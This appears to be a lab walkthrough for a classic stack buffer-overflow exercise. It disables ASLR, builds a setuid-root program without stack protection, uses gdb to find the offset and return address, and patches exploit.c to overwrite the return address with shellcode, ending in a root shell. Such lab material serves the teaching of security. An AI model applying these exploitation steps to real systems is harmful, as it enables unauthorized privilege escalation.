# preparation

disable address apace randomization

    sudo sysctl -w kernel.randomize_va_space=0

# test `call_shellcode.c`

    gcc -z execstack -o call_shellcode call_shellcode.c
    ./call_shellcode

A shell should be invoked here

# compile `stack.c`

    su root
    gcc -o stack -z execstack -fno-stack-protector stack.c
    chmod 4755 stack
    exit

# check return & buffer address

    gdb stack
    disas bof

Take the offset of the instruction `<strcpy>` as N

    b *(bof+0)
    b *(bof+N)
    r
    x/x $esp

You can get `addrA: xxxx` which shows the memory that contains return address

    c
    x/x $esp

Here you'll get `xxxx: addrB` which represents the start address of `buffer`

    p addrA-addrB
    p/x addrA+0x4

Copy ***OFFSET*** *= addA - addrB* and ***RETURN*** *= addrA+0x4* calculated above, then quit gdb

    q
    y

# edit `exploit.c`

insert codes after `memset(&buffer, 0x90, 517);`

```c
long addr = RETURN;
long *ptr = (long *) (buffer + OFFSET);
*ptr = addr;

strcpy(buffer + OFFSET + 4, shellcode);
```

# compile `exploit.c` and run!

    gcc -o exploit exploit.c
    ./exploit
    ./stack

You should see a **#** here, which means you've got a root shell!
